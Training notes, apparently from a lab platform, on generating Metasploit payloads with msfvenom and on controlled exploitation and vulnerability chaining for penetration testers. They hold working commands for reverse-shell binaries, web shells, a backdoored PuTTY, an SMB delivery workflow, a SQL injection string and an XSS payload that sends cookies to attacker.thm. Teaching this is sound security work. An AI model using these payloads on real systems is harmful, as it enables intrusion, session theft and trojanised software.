> [!info] Room context Final room of the Metasploit module. Covers `msfvenom` — standalone payload generation outside of `msfconsole` exploit modules, for scenarios where no exploit module exists, delivery happens through custom means (file upload, SSH transfer, phishing), or a payload needs embedding into an existing binary. Full arc: syntax → staged vs. stageless → formats/recipes → encoding reality check → binary injection/multi-platform → `multi/handler` and the complete generate→deliver→catch workflow.

#### What Is `msfvenom`

**The gap it fills:** every payload used in the first three rooms was delivered automatically by an exploit module (`exploit` handled packaging, delivery, session setup). That workflow breaks down when: no Metasploit exploit module exists for a found vulnerability, a Meterpreter session (not just a shell) is needed over an existing access method (SSH), or a payload needs embedding inside an existing executable for phishing delivery. In each case, a **standalone payload file**, generated independently and delivered manually, is needed.

**`msfvenom`** is a CLI tool, part of the Framework but run from a **regular terminal**, not `msf6 >`. Capabilities:

- Standalone executables (`.exe`, `.elf`, `.apk`, `.war`) delivering Meterpreter/shell on execution
- Raw shellcode in C, Python, PowerShell, C# for embedding in custom tools
- Web shells (PHP, ASP, JSP) for upload through web app vulnerabilities
- Payload encoding (bad-character removal, byte-pattern transformation)
- Injection into existing legitimate binaries

> [!note] History — two tools merged into one Older Metasploit split this into `msfpayload` (raw generation) and `msfencode` (encoding). Both merged into `msfvenom` in 2015 — older tutorials referencing either standalone tool are describing commands that no longer exist.

**Where `msfvenom` fits in the workflow** — adds a manual step exploit modules normally automate:

1. Generate the payload with `msfvenom` (platform, payload type, format, connection details)
2. Deliver it to the target (upload, SSH, phishing, USB drop, any mechanism)
3. Set up a handler in `msfconsole` (`exploit/multi/handler`) to catch the connection
4. Execute the payload on the target (or wait for the victim)
5. Interact with the resulting session

Steps 3–5 are identical to a normal `msfconsole` exploit run — the difference is being responsible for steps 1–2 manually rather than an exploit module handling them.

> [!summary] Quick Recap — What msfvenom Is
> 
> - Standalone payload generation outside `msfconsole`, run from a regular terminal
> - Fills the gap when no exploit module exists, or a custom delivery method is required
> - `msfpayload`/`msfencode` no longer exist — both merged into `msfvenom` in 2015
> - Only steps 1–2 (generate, deliver) are manual — handler setup and session interaction (3–5) are the same as any other exploit

---

#### Basic Syntax and Listing Options

**Core command structure:**

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output_file>
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o shell.exe
```

**Flag breakdown:**

- `-p` — the payload, same `platform/arch/type/connection` naming convention from Room 1
- `LHOST=`/`LPORT=` — **not flags** (no `-` prefix) — these are payload _options_, passed as `KEY=VALUE` after `-p`
- `-f` — output format
- `-o` — output filename. **Without `-o`, msfvenom prints raw payload to stdout** — useful for piping, not for saving a binary

**Complete flag reference:**

|Flag|Purpose|Example|
|---|---|---|
|`-p`|Select payload|`-p linux/x64/meterpreter/reverse_tcp`|
|`-f`|Output format|`-f elf`, `-f exe`, `-f raw`, `-f python`|
|`-o`|Write to file|`-o payload.exe`|
|`-e`|Select encoder|`-e x86/shikata_ga_nai`|
|`-i`|Encoding iterations|`-i 5`|
|`-b`|Bad characters to avoid|`-b '\x00\x0a\x0d'`|
|`-x`|Template binary (injection)|`-x putty.exe`|
|`-k`|Keep template's original behaviour|`-k` (used with `-x`)|
|`-a`|Override architecture|`-a x64`|
|`--platform`|Override platform|`--platform windows`|
|`-n`|Prepend N-byte NOP sled|`-n 16`|

**Discovery — the `-l` (lowercase L) flag lists everything available:**

```bash
msfvenom -l payloads              # ~1,700 entries — pipe through grep
msfvenom -l payloads | grep linux | grep meterpreter
msfvenom -l formats                # split into Executable vs Transform (next section)
msfvenom -l encoders
msfvenom -l platforms
msfvenom -l archs
```

**Checking payload-specific options** — mirrors `msfconsole`'s `show options`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```

> [!summary] Quick Recap — Syntax and Discovery
> 
> - `-p`, `-f`, `-o` are the three mandatory pieces of any real command; `LHOST=`/`LPORT=` are payload options, not msfvenom flags
> - No `-o` = raw output to stdout, useful only for piping, not for saving a runnable file
> - `-l <category>` (payloads/formats/encoders/platforms/archs) + `grep` is the standard discovery pattern — ~1,700 payloads, no need to memorise any of them
> - `--list-options` on a specific payload mirrors `msfconsole`'s `show options` for that payload

---

#### Staged vs. Stageless Payloads

**Recap of the mechanics:**

- **Stageless (inline)** — entire payload self-contained in one file; connects and establishes the session in one step
- **Staged** — a small stager connects first, then the handler sends the larger stage across that connection, loaded into memory and executed

**Trade-offs:**

|Factor|Stageless|Staged|
|---|---|---|
|File size|Larger (full payload included)|Smaller (stager only)|
|Reliability|More reliable — no second download to fail|Depends on connection staying stable through stage transfer|
|Network dependency|Connects once|Sustained connection required to pull the stage|
|Detection surface|Full payload on disk — easier to signature-match|Smaller initial file, but stage transfer itself can be flagged|
|Use with `msfconsole` exploits|Works, less common as default|Default for most exploit modules|
|Use with `msfvenom`|Common for standalone payloads|Works, requires the handler to serve the stage|

**When to choose stageless:**

- Standalone file for manual delivery (USB, upload, SSH transfer) — self-containment matters when network conditions during execution aren't controlled
- Intermittent/unreliable network — only needs to connect once
- Simplicity — no stager/stage coordination to worry about

**When to choose staged:**

- Working within `msfconsole` where the exploit module already handles staging automatically
- Minimising initial payload size matters — e.g. buffer overflow with a tight size constraint
- Delivery channel has size limitations — e.g. SQL injection that can only inject a small shellcode

> [!note] The practical default split Most `msfvenom` standalone payloads use **stageless** (reliability/self-containment wins). Most `msfconsole` exploits use **staged** by default (the exploit module manages staging for you, so the size advantage costs nothing in coordination effort).

**Side-by-side generation, same target payload:**

```bash
# Staged
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o staged.exe
# Payload size: 510 bytes → Final exe: 7168 bytes

# Stageless
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o stageless.exe
# Payload size: 201798 bytes → Final exe: 250880 bytes
```

Only the payload name changed (`/` vs `_`) — everything else identical. The size difference is stark: staged is just the stager (~7KB), stageless is the complete Meterpreter agent (~245KB) ready to run with zero further downloads.

**Handler behaviour differs too:** a staged handler must actively **serve** the stage to the connecting stager — if the handler isn't running, or the payload type doesn't match exactly, the connection fails silently. A stageless handler simply receives an already-complete connection — no stage to serve, making it slightly more forgiving of timing issues.

> [!summary] Quick Recap — Staged vs. Stageless
> 
> - Only the `/` vs `_` in the payload name changes between staged and stageless — every other flag stays identical
> - Standalone `msfvenom` files → stageless is the practical default (self-contained, reliable)
> - `msfconsole` exploits → staged is the practical default (small footprint, staging automated by the exploit module)
> - Staged handlers must actively serve the stage — a mismatch here fails silently with no error, just nothing happening

---

#### Generating Payloads and Output Formats

**Two format categories** (from `msfvenom -l formats`):

- **Executable formats** — standalone binaries the OS runs directly: `exe` (Windows), `elf` (Linux), `macho` (macOS), `msi` (Windows Installer), `apk` (Android), `war` (Java web app)
- **Transform formats** — code/data embedded into another tool/script/exploit: `raw`, `c`, `csharp`, `python`, `powershell`, `hex`, `base64`

**Rule of thumb:** file the target runs directly → executable format. Data embedded in something else → transform format.

**Five common recipes:**

**1. Windows reverse shell (EXE):**

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o shell.exe
```

Use when a file can land on a Windows target (upload, SMB share, phishing attachment, USB). Stageless (`_`) is standard here for reliability.

**2. Linux reverse shell (ELF):**

```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f elf -o shell.elf
```

Use with SSH/SCP/writable web directory/upload access to a Linux target. Requires `chmod +x shell.elf` before `./shell.elf` runs.

**3. PHP web shell:**

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f raw -o shell.php
```

Use for a file upload vulnerability in a PHP app — upload, then trigger via URL.

> [!warning] Verify the PHP opening tag manually Some `msfvenom` versions output the opening tag commented out (`/*<?php /**/`) — if the PHP engine doesn't recognise the file as executable PHP, the payload silently won't run. Open the file and confirm a proper `<?php` tag before uploading.

**4. Python one-liner (transform format, no file at all):**

```bash
msfvenom -p cmd/unix/reverse_python LHOST=CONNECTION_IP LPORT=4444 -f raw
```

Prints directly to terminal — no `-o` flag, no disk file. Use when Python execution is available through command injection/SSH/a web shell — paste or pipe the one-liner directly.

**5. Raw shellcode (C format):**

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f c
```

For custom exploit development — a C-style byte array pasted directly into source code. `-f python`/`-f csharp`/`-f powershell`/`-f hex` follow the identical pattern for their respective targets.

**Quick reference table:**

|Scenario|Payload|Format|
|---|---|---|
|Windows executable file drop|`windows/x64/meterpreter_reverse_tcp`|`exe`|
|Linux executable, SSH transfer|`linux/x64/meterpreter_reverse_tcp`|`elf`|
|PHP web shell, file upload|`php/meterpreter_reverse_tcp`|`raw`|
|Python command injection|`cmd/unix/reverse_python`|`raw`|
|Shellcode, custom C exploit|Any Windows/Linux payload|`c`|
|PowerShell, Windows command exec|`windows/x64/meterpreter_reverse_tcp`|`powershell`|
|Java web app (Tomcat, Jenkins)|`java/meterpreter/reverse_tcp`|`war`|
|Windows Installer delivery|`windows/x64/meterpreter_reverse_tcp`|`msi`|

> [!summary] Quick Recap — Formats and Recipes
> 
> - Executable formats = the target's OS runs the file directly; transform formats = code/data embedded elsewhere
> - PHP payloads need a manual opening-tag check — a silent failure mode that's easy to miss
> - Transform formats (Python one-liner, raw shellcode) never touch disk on the target at all — genuinely different delivery model from a dropped executable
> - The scenario table is the fast lookup — payload+format pairing is driven entirely by target OS/runtime + delivery mechanism

---

#### Encoders and Evasion Basics

> [!warning] The central misconception this section corrects Encoding a payload does **not** bypass modern antivirus/EDR. This is a common beginner assumption and it's simply wrong against anything but the oldest, purely signature-based AV.

**What encoding actually does:** transforms the payload's byte sequence into a different representation. `x86/shikata_ga_nai` (polymorphic XOR additive feedback) — XOR-encrypts with a changing key, prepends a small decoder stub. On execution: decoder stub runs first, decodes the payload back to its original form in memory, then transfers execution to it.

**Legitimate use cases:**

- **Bad character removal** — some delivery channels (e.g. a buffer overflow via a string-copy function) break on specific byte values like null bytes (`\x00`), newlines (`\x0a`), carriage returns (`\x0d`) — encoding ensures these never appear in the output
- **Format compliance** — channels restricted to printable ASCII or similar constraints

**Using encoders:**

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 -o encoded.exe
```

- `-e` selects the encoder, `-i` sets iteration count — each iteration re-encodes the previous output, slightly growing the payload each time (201,798 → 201,894 bytes over 3 iterations in the room's example)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f c -b '\x00\x0a\x0d'
```

- `-b` specifies bad characters to avoid; msfvenom auto-selects a suitable encoder — `-e` isn't strictly required alongside `-b`

**Why encoding doesn't bypass modern AV/EDR:**

Early-2000s AV relied almost entirely on static signature matching — byte-for-byte comparison against known-malicious patterns. Encoding defeated _that_ specifically by changing the byte pattern each generation. Modern endpoint security operates on entirely different layers:

- **Heuristic analysis** — examines _what code does_, not just what it looks like. A decoder stub that decrypts and executes arbitrary code in memory is itself a well-known behavioural pattern
- **Sandboxing** — runs suspicious files in isolation and observes behaviour; the payload decodes and runs normally inside the sandbox, revealing its true purpose regardless of encoding
- **AMSI** — intercepts scripts/payloads at runtime, inspecting _after_ decoding but before execution
- **Machine learning models** — trained on millions of samples, can identify malicious patterns even within polymorphic/varying code

> [!warning] `shikata_ga_nai` itself is now a known signature Running it with 10 iterations against a default Meterpreter payload gets caught by essentially every modern endpoint security product — the XOR decoder stub pattern itself is well-documented and specifically fingerprinted.

**When encoding is still legitimately useful:** exactly its original purpose — bad character avoidance in exploit development. A buffer overflow exploit that must avoid null bytes/newlines is a real, technical requirement, not a stealth attempt.

> [!note] Real evasion lives beyond msfvenom Genuine evasion against modern defenses requires custom loaders, process injection techniques, AMSI bypass methods, and payload obfuscation tooling — topics beyond `msfvenom`'s scope, covered in more advanced modules.

> [!summary] Quick Recap — Encoders and Evasion
> 
> - Encoding = byte-pattern transformation, not encryption in any security-meaningful sense, and NOT an AV/EDR bypass technique
> - Legitimate use: bad-character removal for exploit delivery channels with byte restrictions — a real technical constraint, not a stealth tactic
> - `shikata_ga_nai` specifically is a well-known, actively-fingerprinted pattern in modern EDR — using it for "evasion" is actively counterproductive
> - Modern detection operates on behaviour (heuristics, sandboxing, AMSI, ML), which encoding does nothing to address since the decoded payload still behaves identically once executed

---

#### Payload Injection and Multi-Platform Payloads

**Injecting into existing binaries — the `-x` flag:**

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -x /root/templates/putty.exe -f exe -o putty_backdoor.exe
```

Payload injected into a legitimate template binary (e.g. PuTTY) — output is the original app's size plus the payload (~1.5MB in the room's example). Running the file executes the payload and connects back.

**Preserving original functionality — `-k`:**

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -x /root/templates/putty.exe -k -f exe -o putty_backdoor.exe
```

`-k` runs the payload in a **separate thread**, so the template application still launches and functions normally alongside the payload executing in the background — the user sees the expected app, the attacker gets a session.

**Detection trade-offs of template injection:**

- **Hash mismatch** — the injected binary's hash will differ from the original; any integrity-checking system flags this immediately
- **Digital signature breakage** — a digitally signed original becomes invalid after injection — Windows shows "publisher could not be verified," signature-verification tools flag it
- **AV heuristics** — the specific pattern of "legitimate binary + injected code section" is well-known and commonly detected on its own, independent of the payload itself

> [!warning] Template injection is a lab/CTF technique, not a real-engagement one as-is Useful and reliable in controlled environments. Against a genuinely defended network, it needs additional obfuscation layers to be practical — the technique alone is too well-fingerprinted.

**Multi-platform payload generation:**

**Android (APK):**

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -o evil.apk
```

No `-f` needed — auto-selected for Android. Modern Android requires developer mode + explicit permission for unknown-source app installs.

**macOS (Mach-O):**

```bash
msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f macho -o shell.macho
```

Mach-O is macOS's native binary format — the equivalent of ELF (Linux) / PE (Windows).

**Java web app (WAR):**

```bash
msfvenom -p java/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f war -o shell.war
```

Deployed to Tomcat/JBoss/GlassFish — via Tomcat Manager (often default creds), execution triggers on browsing to the deployed app's URL.

**ASP/ASPX (IIS):**

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f aspx -o shell.aspx
```

Targets IIS/.NET — same upload-then-trigger model as PHP.

**JSP:**

```bash
msfvenom -p java/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f jsp -o shell.jsp
```

Java web servers, individual-file upload alternative to a full WAR package deployment.

**Choosing platform and format — the decision tree:**

1. **Target OS** → payload platform (`windows/`, `linux/`, `osx/`, `android/`, `java/`, `php/`)
2. **Delivery method** → format: file drop → executable format; web upload → web format (`php`/`asp`/`aspx`/`jsp`/`war`); code injection → transform format (`raw`/`c`/`python`)
3. **Available runtime** → PHP present → PHP payload; Java present → WAR/JSP; bare OS, no interpreter → native binary

> [!summary] Quick Recap — Injection and Multi-Platform
> 
> - `-x` injects into a template binary; `-k` preserves the original app's functionality by running the payload in a separate thread
> - Injection introduces three independent detection vectors (hash mismatch, broken signature, AV heuristics on the injection pattern itself) — real defenses need more than this alone
> - Multi-platform generation follows the same 3-step decision tree every time: target OS → delivery method → available runtime
> - No `-f` needed for some platforms (Android) — msfvenom auto-selects the correct format when there's only one sensible choice

---

#### Handlers and Catching Shells

**The final piece:** a reverse-connecting payload needs somewhere to connect back to — a **handler**, a listener on the attacking machine that accepts incoming connections and establishes sessions.

**`exploit/multi/handler`** — Metasploit's universal listener, works with every payload type (Meterpreter, command shells, PHP/Python reverse shells, etc.), configured exactly like any other module.

**Setting up the handler:**

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST CONNECTION_IP
set LPORT 4444
show options
run
```

```
[*] Started reverse TCP handler on CONNECTION_IP:4444
```

On payload execution on the target:

```
[*] Meterpreter session 1 opened (CONNECTION_IP:4444 -> MACHINE_IP:55320)
meterpreter >
```

> [!warning] The golden rule — three values must match EXACTLY between generation and handler
> 
> |Parameter|In `msfvenom`|In `multi/handler`|
> |---|---|---|
> |Payload|`-p windows/x64/meterpreter_reverse_tcp`|`set PAYLOAD windows/x64/meterpreter_reverse_tcp`|
> |LHOST|`LHOST=CONNECTION_IP`|`set LHOST CONNECTION_IP`|
> |LPORT|`LPORT=4444`|`set LPORT 4444`|
> 
> A mismatch on **any** of these — including a staged (`/`) payload generated but a stageless (`_`) handler configured, or vice versa — causes the connection to **fail silently**. No error message. The target connects, the handler doesn't recognise the connection type, and nothing visibly happens. This is the single most common reason a shell fails to catch.

**Full generate → deliver → catch workflow** (SSH-access scenario against a Stratford Windows server):

**Step 1 — generate:**

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o shell.exe
```

**Step 2 — start the handler** (separate terminal or backgrounded):

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST CONNECTION_IP
set LPORT 4444
run
```

**Step 3 — deliver** (e.g. via SMB upload):

```
use auxiliary/admin/smb/upload_file
set rhosts MACHINE_IP
set smbuser guest
set smbshare public
set lpath /root/shell.exe
set rpath shell.exe
exploit
```

**Step 4 — execute on the target:**

```
C:\public>shell.exe
```

**Step 5 — catch the session** (back in `msfconsole`):

```
[*] Meterpreter session 1 opened
meterpreter > sysinfo
```

**Handler operational tips:**

**Background the handler with `-j`** — continue working in `msfconsole` while it waits:

```
run -j
```

**`ExitOnSession false`** — by default the handler stops after the first session; set this to keep listening for additional connections (e.g. the same payload deployed to multiple hosts):

```
set ExitOnSession false
```

**`AutoRunScript`** — runs a command/script automatically on every new session, e.g. auto-migrating to a stable process:

```
set AutoRunScript post/windows/manage/migrate
```

Saves manual repetition when expecting multiple sessions with a consistent post-exploitation setup desired on each.

> [!summary] Quick Recap — Handlers
> 
> - `exploit/multi/handler` is universal — works with any payload type, configured like any other module
> - Payload string, `LHOST`, and `LPORT` must match **exactly** between generation and handler — any mismatch (including staged/stageless) fails silently with zero error output
> - Full workflow: generate → start handler → deliver (any mechanism) → execute on target → catch — steps 3–5 mirror a normal exploit's automatic behaviour, just done manually
> - `run -j` backgrounds the handler; `ExitOnSession false` keeps it listening past the first catch; `AutoRunScript` automates a consistent post-exploitation step on every new session

---

> [!summary] Full Payload Generation Room — One Glance
> 
> - `msfvenom` fills the gap when no exploit module exists or delivery must happen through custom means — run from a regular terminal, not `msfconsole`
> - `-p`/`-f`/`-o` are the core flags; `LHOST=`/`LPORT=` are payload options, not msfvenom flags; `-l <category>` + `grep` is the standard discovery pattern across ~1,700 payloads
> - Staged vs. stageless: `/` vs `_` in the name — stageless is the standalone-file default, staged is the `msfconsole` exploit default
> - Executable formats (target runs the file) vs. transform formats (code embedded elsewhere) — five core recipes cover Windows/Linux/PHP/Python/raw shellcode scenarios
> - Encoding is bad-character removal for exploit development — **not** an AV/EDR evasion technique; modern detection (heuristics, sandboxing, AMSI, ML) sees straight through it
> - `-x`/`-k` inject payloads into legitimate binaries — functional in labs, but hash mismatch + broken signatures + AV heuristics make it unreliable against real defended networks without further obfuscation
> - `exploit/multi/handler` catches every payload type — payload/`LHOST`/`LPORT` must match generation exactly, or the connection fails with zero visible error
### Exploitation and Weaponisation

> [!info] Room context "Weaponisation" has two valid but different meanings in security. **This room's definition** (the consultant's usage): turning a confirmed vulnerability into a demonstrated business impact — proving what an attacker could realistically achieve, not just that a flaw exists. (The Cyber Kill Chain room uses a different definition: creating a deliverable payload, e.g. embedding a backdoor in a document — not what this room covers.)
> 
> **Exploitation** = interacting with a confirmed vulnerability in a controlled, minimal way to prove it's abusable under real conditions. **Weaponisation** = aligning that confirmed exploit with attacker goals and business impact — chaining issues, abusing logic, leveraging trust relationships — to produce an outcome stakeholders can actually understand and act on.

#### From Vulnerability Discovery to Exploitation

**Analysing a finding before touching it:** understand what component is affected, the conditions required for exploitability, and what a successful attempt would actually look like. Starting questions: does it affect a specific endpoint, a network service, a parameter, or an entire workflow? Who are the actual users interacting with it? Assessing severity requires understanding the functionality's real business use-case, not just the technical mechanism.

**Confirming exploitability — not every finding is real under live conditions.** A version match or config check is not the same as direct interaction confirming the flaw. Verify it yourself:

- **Network exploitation** — check the service version directly; Metasploit auxiliary scanners exist for exactly this (`auxiliary/scanner/smb/smb_ms17_010` confirms MS17-010 before any exploit module runs)
- **Web vulnerabilities** — interact with the functionality directly. Suspected IDOR on a bank account endpoint? Establish a baseline with your own account first, then attempt the same request structure against another user's ID

> [!note] `check` before `exploit` Many exploit modules support a `check` command that confirms vulnerability without firing the actual payload — a safer first step, especially against services that could crash on a payload that doesn't land cleanly.

**Reproducing reliably:** a vulnerability triggerable only once is nearly impossible to document credibly or re-test at engagement's end. Reproduce **at least twice** under the same conditions before proceeding. If it's inconsistent, investigate why — application state, session tokens, caching, and timing can all affect trigger reliability.

**Deciding whether to exploit at all:** not every finding needs active exploitation to prove impact. A missing security header or an exposed server banner doesn't need a demonstration — document and move on. Only perform the **minimum** exploitation needed when the impact genuinely requires demonstration to be credible.

**Worked examples:**

_Network_ — `auxiliary/scanner/smb/smb_ms17_010` against a Windows 7 SMB host returns `Host is likely VULNERABLE to MS17-010!` — confirmed grounds to proceed to controlled exploitation with the exact vulnerability already understood.

_Web_ — authenticated as account `12345` at `/accounts/12345/summary`, changing the ID to `12346` in the request returns another user's account data — IDOR confirmed, reproduced, preconditions understood, ready for controlled exploitation.

> [!summary] Quick Recap — Discovery to Exploitation
> 
> - Understand the affected functionality and its real business use-case _before_ deciding how seriously to treat a finding
> - Verify exploitability yourself — a scanner/`check` confirmation for network findings, a direct baseline-then-attempt comparison for web findings
> - Reproduce at least twice before moving forward — inconsistent triggers need investigation, not assumption
> - Not every finding needs active exploitation — document low-risk findings directly, exploit only when demonstration is genuinely needed for credibility

---

#### Controlled Exploitation Techniques

**The goal is proof, not damage.** Everything beyond proving impact is unnecessary and potentially harmful to the client. Three governing principles: **prove control minimally**, **scope the blast radius**, **document as you go**.

#### Prove Control Minimally

Demonstrate influence over the system's behaviour without going further than needed:

- Command injection → `whoami`/`hostname` confirms code execution without ever writing to the filesystem
- SQL injection → `@@version`/`SELECT SYSTEM_USER` reveals DB type/version and whether the app runs with elevated privileges
- XSS → `alert(document.domain)` demonstrates script execution; session cookie theft (only with an explicitly provided privileged test account) demonstrates real impact beyond a popup
- A reverse shell or extracting a **single** database record is sufficient — a full dump or a lateral movement chain adds no additional proof value

#### Scope the Blast Radius

Not every action carries equal risk:

|Action type|Examples|Justification needed|
|---|---|---|
|Reversible/non-destructive|Reading a single record, confirming admin panel access|Sufficient on its own — low risk, proves impact|
|Irreversible/destructive|Creating accounts, modifying/deleting data, disabling services|Only if there's no other way to demonstrate the finding, **and** explicit client authorisation exists|

> [!warning] The client already knows deletion would be bad Demonstrating destructive capability (deleting records, crashing a service) adds nothing to a report — the client doesn't need proof that catastrophic outcomes are catastrophic. They need proof an attacker **could reach that point**, not a live demonstration of the catastrophe itself.

Automated tools carry real operational risk here too — a wide-scope SQLMap run, blindly firing Metasploit exploits at a live service, or testing against fifty real accounts can cause downtime and trigger alerts. **Knowing when to stop is itself part of the skill.**

#### Document as You Go

Two direct benefits: maps out reproduction steps for later, and clarifies exactly what evidence is actually needed — avoiding a scramble to reconstruct and re-trigger everything at report time.

**What good evidence actually is:** not volume — the request that triggered it, the response that confirmed it, a timestamp, and enough context for another tester to reproduce it. **Before-and-after screenshots beat twenty screenshots that need extra explanation.**

**Worked examples:**

_Network_ — MS17-010 confirmed via scanner → EternalBlue launched (`set RHOST`/`LHOST`/`PAYLOAD` → `run`) → session opens → `getuid` returns `NT AUTHORITY\SYSTEM`. **That single command is the entire proof needed** — no further post-exploitation required to demonstrate the finding.

_Web_ — SQL injection confirmed on a search parameter in an MSSQL-backed app:

```sql
' UNION SELECT NULL, @@version, SYSTEM_USER, NULL --
```

Reveals `Microsoft SQL Server 2019` and current user `sa` — the **most privileged account in MSSQL**. This alone establishes the injection can reach every database on the server and potentially enable `xp_cmdshell` — **without actually enabling it**. Knowing the ceiling of impact doesn't require touching that ceiling to prove the finding.

> [!summary] Quick Recap — Controlled Exploitation
> 
> - Minimal proof: `whoami`, `@@version`, `alert(document.domain)` — single, low-impact commands that establish control without escalating further than necessary
> - Reversible actions justify themselves; irreversible ones need both necessity _and_ explicit client authorisation
> - Confirming a privilege ceiling (e.g. `sa` access) doesn't require actually exercising that ceiling (e.g. enabling `xp_cmdshell`) to document the finding
> - Evidence quality > evidence quantity — request/response pair, timestamp, reproduction context beats a screenshot flood

---

#### Context-Aware Weaponisation

Where technical exploitation meets business impact — after confirming a vulnerability exists, identify how it actually affects the client's security posture.

**Trust boundaries** — every app/network has intentional boundaries defining what users/services/systems are allowed to do (regular user ≠ admin functionality, external web server ≠ internal systems). **A vulnerability becomes serious specifically when it crosses one of these boundaries.** An IDOR between two regular user accounts carries a fundamentally different business impact than an IDOR letting a regular user reach an admin account or trigger a privileged action — identifying _which_ boundary is crossed is the actual weaponisation step.

**Technical access ≠ business impact — these are genuinely different axes.** A password reset flaw enabling full account takeover vs. a display-preference bug (worst case: an unwanted theme colour) can look similar in raw "technical access" terms but carry wildly different real-world consequences. Same logic on network infrastructure: compromising a domain controller compromises every machine/account/credential in the environment; compromising an isolated workstation with no further reach does not. **Weaponisation means thinking through how an attacker would actually leverage the access to maximise demonstrated impact to the client.**

**Leveraging existing functionality** — understanding how a system is _supposed_ to work, then showing how it can be turned against itself. This is often stealthy and hard to detect precisely because nothing new is introduced — features like password reset, money transfer, a reachable admin API, or an over-permissioned service account are all legitimate by design but become attack paths with the right context.

Example: a foreign exchange conversion feature that accepts the exchange rate in the request body with no server-side validation — submitting a transfer with a manipulated rate demonstrates financial controls can be bypassed **using nothing but a parameter change**, no new exploit technique required.

**High-value actions** — functionality whose abuse directly impacts the business or its users carries outsized weaponisation value:

|High-Value Action|Exploitation/Weaponisation Angle|
|---|---|
|Password Reset|Flawed reset flows → account hijack → access escalation|
|User Role Management|Privilege assignment manipulation → admin/elevated access|
|Payment Functions|Tamper with payment logic, transaction values, or bypass approval workflows|
|Data Retrieval|IDOR → mass customer data collection|

> [!summary] Quick Recap — Context-Aware Weaponisation
> 
> - Identify which specific trust boundary a vulnerability crosses — that's the actual severity driver, not the raw technical mechanism alone
> - Technical access and business impact are separate questions — always ask both, since similar-looking access can carry wildly different real consequences
> - The strongest weaponisation often uses zero new techniques — just legitimate functionality (payment logic, role management, password reset) used in an unintended way
> - Password reset, role management, payment functions, and data retrieval are the four recurring high-value action categories worth prioritising

---

#### Chaining Vulnerabilities

**Why chaining matters:** individual vulnerabilities often look unimpressive in isolation, but chaining them together can massively increase overall business impact. This is a genuine skill-building area for a junior tester — the value-add is real, not just theoretical.

**What chaining means:** using one vulnerability's outcome to increase the impact of a second, producing a realistic attack path showing how a low-risk flaw enables a more severe one. Not every combination is worth chaining — prioritise chains that demonstrably increase impact (e.g. user enumeration → account takeover via a password recovery flaw).

**Identifying pivot points** — a pivot point is where one vulnerability's output becomes another's input:

|Vulnerability Class|Exploit Chain Pattern|
|---|---|
|Information Disclosure|Verbose errors/stack traces reveal internal API endpoints or underlying tech; debug pages may leak session tokens or config values — unlocking access that would otherwise require guessing|
|Broken Access Control|Read access without corresponding checks often means adjacent write access or related functionality assumed to share the same (broken) access control gate is also reachable|
|Logic Flaws|Workflows used out of intended sequence reach unintended states — a password reset missing token-ownership validation, combined with username enumeration, is a realistic full account-takeover path|

**Keeping chains controlled:** every step in a chain still follows the same three controlled-exploitation principles from the previous section — minimal exploitation, safe payloads, a clear stopping point. **The chain ends once the combined impact is fully demonstrated — no further.**

**Worked example, network chain:**

```
ftp 10.0.0.8                          # anonymous FTP login succeeds
ls                                    # backup_config.txt visible
get backup_config.txt
cat backup_config.txt                 # plaintext SSH creds for a second host
ssh svcadmin@10.0.0.15                # authenticate using the leaked credentials
```

Each step alone: medium severity (anonymous FTP access; plaintext credentials in a backup file). **Chained: lateral movement to a second host becomes a high-severity finding** — the chain tells the realistic story of how an attacker actually moves through the environment, which no single step communicates alone.

**Worked example, web application chain:**

Customer support chatbot stores/renders user input without sanitisation → confirmed stored XSS. Logging into the **test** admin account confirms the script executes in the admin's browser context, and that the admin's session cookie has **no `HttpOnly` flag** (JS-readable).

With both conditions confirmed, chain them:

```html
<script>fetch('https://attacker.thm/log?c='+document.cookie)</script>
```

Test admin's session token received at the attacker's server → used in a separate browser → full admin access confirmed **without ever knowing the admin's password**. Every step performed against the provided test admin account — the escalation path (unauthenticated user → admin access) is demonstrated with clean evidence at every stage.

> [!summary] Quick Recap — Chaining Vulnerabilities
> 
> - A chain's value is in the _realistic attack narrative_ it tells — individually unimpressive findings become a high-severity story once linked
> - Three recurring pivot-point classes: information disclosure (unlocks access), broken access control (read often implies adjacent write), logic flaws (out-of-sequence workflow abuse)
> - Every link in the chain still follows minimal-exploitation principles — the chain has a defined end once combined impact is proven, same discipline as single-vulnerability exploitation
> - Both worked examples used _only provided test accounts/access_ — chaining doesn't license working outside the authorised scope

---

#### Tools in Context

Tools save time but can also cause unintended disruption, especially in production. **Using a tool without understanding what it actually does is one of the most common junior-tester mistakes.**

#### Metasploit Framework

